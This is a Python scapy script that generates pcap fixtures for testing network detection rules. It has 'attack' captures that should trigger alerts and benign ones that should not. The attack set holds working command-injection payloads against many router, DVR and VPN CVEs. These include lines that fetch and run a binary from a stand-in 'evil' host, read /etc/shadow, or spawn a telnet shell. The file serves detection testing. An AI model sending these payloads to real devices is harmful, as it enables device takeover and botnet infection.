import os, sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _lib.h2c_http_helper import build_pcap
from scapy.all import IP, UDP, TCP, Raw, wrpcap

H = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pcaps")
os.makedirs(H, exist_ok=True)

def req(method, path, body="", host="10.99.0.20", ct="application/x-www-form-urlencoded", port=80, extra_hdrs=""):
    h = f"{method} {path} HTTP/1.1\r\nHost: {host}:{port}\r\nUser-Agent: curl/8.5\r\n"
    if extra_hdrs:
        h += extra_hdrs
    if body:
        h += f"Content-Type: {ct}\r\nContent-Length: {len(body)}\r\n"
    h += f"Connection: close\r\n\r\n{body}"
    return h.encode("latin-1")

def ok(b=b'{"ok":true}'):
    return b"HTTP/1.1 200 OK\r\nServer: test\r\nContent-Length: %d\r\n\r\n" % len(b) + b

def udp_pcap(name, payload, src="10.99.0.10", dst="10.99.0.20", sport=12345, dport=9034):
    pkt = IP(src=src, dst=dst) / UDP(sport=sport, dport=dport) / Raw(payload)
    wrpcap(f"{H}/{name}.pcap", [pkt])

def tcp_raw_pcap(name, payload, src="10.99.0.10", dst="10.99.0.20", sport=54321, dport=56789):
    seq_c, seq_s = 1000, 2000
    pkts = [
        IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="S", seq=seq_c),
        IP(src=dst, dst=src) / TCP(sport=dport, dport=sport, flags="SA", seq=seq_s, ack=seq_c + 1),
        IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="A", seq=seq_c + 1, ack=seq_s + 1),
        IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="PA", seq=seq_c + 1, ack=seq_s + 1) / Raw(payload),
    ]
    wrpcap(f"{H}/{name}.pcap", pkts)


# ========== ATTACK PCAPs (should fire) ==========

ATTACK = {}

# CVE-2021-35394: Realtek SDK UDPServer
ATTACK["attack_cve_2021_35394_realtek_udp"] = lambda: udp_pcap(
    "attack_cve_2021_35394_realtek_udp",
    b"orf;cd /tmp;wget http://evil/m -O b;sh b"
)

# CVE-2014-8361: Realtek miniigd UPnP SOAP
soap_body = (
    '<?xml version="1.0"?>\r\n'
    '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">\r\n'
    '<SOAP-ENV:Body>\r\n'
    '<m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1">\r\n'
    '<NewInternalClient>`wget http://evil/m`</NewInternalClient>\r\n'
    '<NewEnabled>1</NewEnabled>\r\n'
    '</m:AddPortMapping>\r\n'
    '</SOAP-ENV:Body>\r\n'
    '</SOAP-ENV:Envelope>'
)
ATTACK["attack_cve_2014_8361_realtek_upnp"] = lambda: build_pcap(
    f"{H}/attack_cve_2014_8361_realtek_upnp.pcap",
    [req("POST", "/wanipcn.xml?service=WANIPConn1", soap_body, ct="text/xml", port=52869,
         extra_hdrs='SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\n')],
    [ok()], server_port=52869
)

# CVE-2016-20016: MVPower DVR /shell
ATTACK["attack_cve_2016_20016_mvpower_shell"] = lambda: build_pcap(
    f"{H}/attack_cve_2016_20016_mvpower_shell.pcap",
    [req("GET", "/shell?cd+/tmp;wget+http://evil/m;sh+m")], [ok()]
)

# CVE-2022-36553: Hytec Inter popen.cgi
ATTACK["attack_cve_2022_36553_hytec_popen"] = lambda: build_pcap(
    f"{H}/attack_cve_2022_36553_hytec_popen.pcap",
    [req("GET", "/cgi-bin/popen.cgi?command=cat%20/etc/shadow")], [ok()]
)

# CVE-2023-26801: LB-LINK set_LimitClient_cfg
ATTACK["attack_cve_2023_26801_lblink"] = lambda: build_pcap(
    f"{H}/attack_cve_2023_26801_lblink.pcap",
    [req("POST", "/goform/set_LimitClient_cfg",
         "time1=00:00-00:00&time2=00:00-00:00&mac=;wget http://evil/m;",
         extra_hdrs="Cookie: user=admin\r\n")],
    [ok()]
)

# CVE-2024-3721: TBK DVR device.rsp
ATTACK["attack_cve_2024_3721_tbk_dvr"] = lambda: build_pcap(
    f"{H}/attack_cve_2024_3721_tbk_dvr.pcap",
    [req("GET", "/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=id",
         extra_hdrs="Cookie: uid=1\r\n")],
    [ok()]
)

# CVE-2023-1389: TP-Link Archer AX21 locale
ATTACK["attack_cve_2023_1389_tplink_locale"] = lambda: build_pcap(
    f"{H}/attack_cve_2023_1389_tplink_locale.pcap",
    [req("POST", "/cgi-bin/luci/;stok=/locale?form=country",
         "operation=write&country=$(id)")],
    [ok()]
)

# CVE-2024-7029: AVTECH Factory.cgi brightness
ATTACK["attack_cve_2024_7029_avtech_brightness"] = lambda: build_pcap(
    f"{H}/attack_cve_2024_7029_avtech_brightness.pcap",
    [req("POST", "/cgi-bin/supervisor/Factory.cgi",
         "action=white_led&brightness=$(id 2>&1) #")],
    [ok()]
)

# CVE-2025-34035: EnGenius usbinteract.cgi
ATTACK["attack_cve_2025_34035_engenius"] = lambda: build_pcap(
    f"{H}/attack_cve_2025_34035_engenius.pcap",
    [req("POST", "/web/cgi-bin/usbinteract.cgi",
         'action=7&path="|id||"', port=9000)],
    [ok()], server_port=9000
)

# CVE-2023-46805 + CVE-2024-21887: Ivanti Connect Secure
ATTACK["attack_cve_2023_46805_ivanti_chain"] = lambda: build_pcap(
    f"{H}/attack_cve_2023_46805_ivanti_chain.pcap",
    [req("POST",
         "/api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection",
         '{"type":"1","txtGCPProject":"a]};id;#","txtGCPSecret":"a","txtGCPBucket":"a","txtGCPFolder":"a"}',
         ct="application/json", port=443)],
    [ok()], server_port=443
)

# CVE-2024-10915: D-Link NAS account_mgr.cgi
ATTACK["attack_cve_2024_10915_dlink_nas"] = lambda: build_pcap(
    f"{H}/attack_cve_2024_10915_dlink_nas.pcap",
    [req("GET", "/cgi-bin/account_mgr.cgi?cmd=cgi_user_add&group=%27;id;%27")],
    [ok()]
)

# CVE-2023-41011: China Mobile HG6543C4 shortcut_telnet.cg
ATTACK["attack_cve_2023_41011_chinamobile"] = lambda: build_pcap(
    f"{H}/attack_cve_2023_41011_chinamobile.pcap",
    [req("GET", "/shortcut_telnet.cg?cmd=id")],
    [ok()]
)

# CVE-2025-34037: Linksys tmUnblock.cgi
ATTACK["attack_cve_2025_34037_linksys"] = lambda: build_pcap(
    f"{H}/attack_cve_2025_34037_linksys.pcap",
    [req("POST", "/tmUnblock.cgi",
         "ttcp_ip=-h+`wget+http://evil/m`&action=&ttcp_num=2&ttcp_size=2&submit_button=&change_action=&command=start_ping",
         port=8080, extra_hdrs="Authorization: Basic YWRtaW46YWRtaW4=\r\n")],
    [ok()], server_port=8080
)

# CVE-2026-87827: KGUARD DVR rsSystemServer wget
ATTACK["attack_cve_2026_87827_kguard_wget"] = lambda: tcp_raw_pcap(
    "attack_cve_2026_87827_kguard_wget",
    b"wget http://evil/mips -O /tmp/a; chmod 777 /tmp/a; /tmp/a\n"
)

# CVE-2026-87827: KGUARD DVR rsSystemServer curl
ATTACK["attack_cve_2026_87827_kguard_curl"] = lambda: tcp_raw_pcap(
    "attack_cve_2026_87827_kguard_curl",
    b"curl http://evil/mips -o /tmp/a && chmod +x /tmp/a && /tmp/a\n"
)

# CVE-2026-36356: MeiG Smart SetRemoteAccessCfg
ATTACK["attack_cve_2026_36356_meig"] = lambda: build_pcap(
    f"{H}/attack_cve_2026_36356_meig.pcap",
    [req("POST", "/action/SetRemoteAccessCfg",
         '{"password":"$(telnetd -l /bin/sh -p 2323 &)"}',
         ct="application/json")],
    [ok()]
)

# CVE-2025-67038: Lantronix EDS5000 rpc/auth
ATTACK["attack_cve_2025_67038_lantronix"] = lambda: build_pcap(
    f"{H}/attack_cve_2025_67038_lantronix.pcap",
    [req("POST", "/cgi-bin/luci/rpc/auth",
         '{"method":"login","params":["$(id > /tmp/pwned)","anything"]}',
         ct="application/json")],
    [ok()]
)


# ========== BENIGN PCAPs (should NOT fire) ==========

BENIGN = {}

# Normal STUN on port 9034 (no orf; prefix)
BENIGN["benign_normal_udp_9034"] = lambda: udp_pcap(
    "benign_normal_udp_9034", b"\x00\x01\x00\x00ABCDEFGHIJKL"
)

# Normal UPnP GetExternalIPAddress (not AddPortMapping)
normal_soap = (
    '<?xml version="1.0"?>\r\n'
    '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">\r\n'
    '<SOAP-ENV:Body>\r\n'
    '<m:GetExternalIPAddress xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1"/>\r\n'
    '</SOAP-ENV:Body>\r\n'
    '</SOAP-ENV:Envelope>'
)
BENIGN["benign_normal_upnp_get_ip"] = lambda: build_pcap(
    f"{H}/benign_normal_upnp_get_ip.pcap",
    [req("POST", "/wanipcn.xml", normal_soap, ct="text/xml", port=52869)],
    [ok()], server_port=52869
)

# Normal CGI request (not popen.cgi)
BENIGN["benign_normal_cgi"] = lambda: build_pcap(
    f"{H}/benign_normal_cgi.pcap",
    [req("GET", "/cgi-bin/status.cgi?interface=eth0")], [ok()]
)

# Normal goform request (different endpoint)
BENIGN["benign_normal_goform"] = lambda: build_pcap(
    f"{H}/benign_normal_goform.pcap",
    [req("POST", "/goform/set_wifi", "ssid=MyWifi&password=secret")], [ok()]
)

# Normal DVR device.rsp without the magic command
BENIGN["benign_normal_device_rsp"] = lambda: build_pcap(
    f"{H}/benign_normal_device_rsp.pcap",
    [req("GET", "/device.rsp?opt=sys&cmd=status")], [ok()]
)

# Normal OpenWrt luci login (not /locale path, no injection)
BENIGN["benign_normal_luci_login"] = lambda: build_pcap(
    f"{H}/benign_normal_luci_login.pcap",
    [req("POST", "/cgi-bin/luci/rpc/auth",
         '{"method":"login","params":["admin","password123"]}',
         ct="application/json")],
    [ok()]
)

# Normal Ivanti API (no path traversal)
BENIGN["benign_normal_ivanti_api"] = lambda: build_pcap(
    f"{H}/benign_normal_ivanti_api.pcap",
    [req("GET", "/api/v1/totp/user-backup-code", port=443)],
    [ok()], server_port=443
)

# Normal TCP on port 56789 (no shell commands)
BENIGN["benign_normal_tcp_56789"] = lambda: tcp_raw_pcap(
    "benign_normal_tcp_56789", b"GET /status\r\n"
)

# Normal D-Link NAS account_mgr.cgi (list, not cgi_user_add)
BENIGN["benign_normal_dlink_nas"] = lambda: build_pcap(
    f"{H}/benign_normal_dlink_nas.pcap",
    [req("GET", "/cgi-bin/account_mgr.cgi?cmd=cgi_get_user_list")], [ok()]
)


if __name__ == "__main__":
    for name, gen in {**ATTACK, **BENIGN}.items():
        gen()
    print(f"Attack: {len(ATTACK)}  Benign: {len(BENIGN)}")
